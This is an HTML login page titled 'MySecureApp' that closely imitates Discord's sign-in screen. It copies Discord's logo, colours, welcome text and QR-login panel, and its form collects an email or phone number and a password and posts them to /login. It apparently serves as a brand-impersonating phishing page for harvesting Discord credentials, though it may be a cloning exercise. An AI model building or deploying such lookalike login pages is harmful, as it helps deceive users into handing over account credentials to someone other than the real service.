<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login â€“ MySecureApp</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #36393f;
      color: #dcddde;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .wrapper {
      display: flex;
      flex-wrap: wrap;
      max-width: 900px;
      width: 90%;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
      overflow: hidden;
      position: relative;
    }

    .login-left {
      flex: 1 1 300px;
      padding: 30px;
      background-color: rgba(47, 49, 54, 0.95);
      position: relative;
      z-index: 2;
    }

    .qr-right {
      flex: 1 1 300px;
      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1wPG5Hw_GtnyedH8VWglMcG5da1m0hjzae5gg7VOPgTZ_WxNcLkimtnU_&s=10');
      background-repeat: no-repeat;
      background-position: center;
      background-size: contain;
      background-color: #2f3136;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 30px;
    }

    .qr-right h3 {
      margin-top: 20px;
      font-size: 16px;
      color: #fff;
    }

    .qr-right p {
      font-size: 12px;
      color: #b9bbbe;
      text-align: center;
    }

    .form-logo-mobile {
      display: none;
      width: 120px;
      margin: 0 auto 20px auto;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 3px;
      background-color: #202225;
      color: #dcddde;
    }

    label {
      font-size: 12px;
      margin-bottom: 5px;
      display: block;
    }

    button {
      background-color: #5865f2;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background-color: #4752c4;
    }

    a {
      color: #00a8fc;
      font-size: 12px;
      text-decoration: none;
    }

    .form-footer {
      font-size: 12px;
      text-align: center;
      margin-top: 15px;
    }

    /* === MOBILE RESPONSIVE === */
    @media screen and (max-width: 768px) {
      body {
        align-items: flex-start;
        padding-top: 40px;
      }

      .qr-right {
        display: none;
      }

      .form-logo-mobile {
        display: block;
      }

      .wrapper {
        background-color: #2f3136;
        box-shadow: none;
      }
    }
  </style>
</head>
<body>

  <div class="wrapper">

    <!-- Left Side: Login Form -->
    <div class="login-left">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Discord_colour_textlogo_%282021%29.svg/1200px-Discord_colour_textlogo_%282021%29.svg.png" alt="Discord Logo" class="form-logo-mobile" />

      <h2 style="margin-top:0;">Welcome back!</h2>
      <p>We're so excited to see you again!</p>

      <form method="post" action="/login">
        <label for="email">EMAIL OR PHONE NUMBER *</label>
        <input type="email" id="email" name="email" required>

        <label for="password">PASSWORD *</label>
        <input type="password" id="password" name="password" required>

        <a href="#">Forgot your password?</a><br><br>

        <button type="submit">Log In</button>
      </form>

      <p class="form-footer">
        Need an account? <a href="#">Register</a>
      </p>
    </div>

    <!-- Right Side: QR IMAGE (Desktop Only) -->
    <div class="qr-right">
      <h3>Log in with QR Code</h3>
      <p>Scan this with the MySecureApp mobile app<br> to log in instantly.</p>
    </div>

  </div>

</body>
</html>
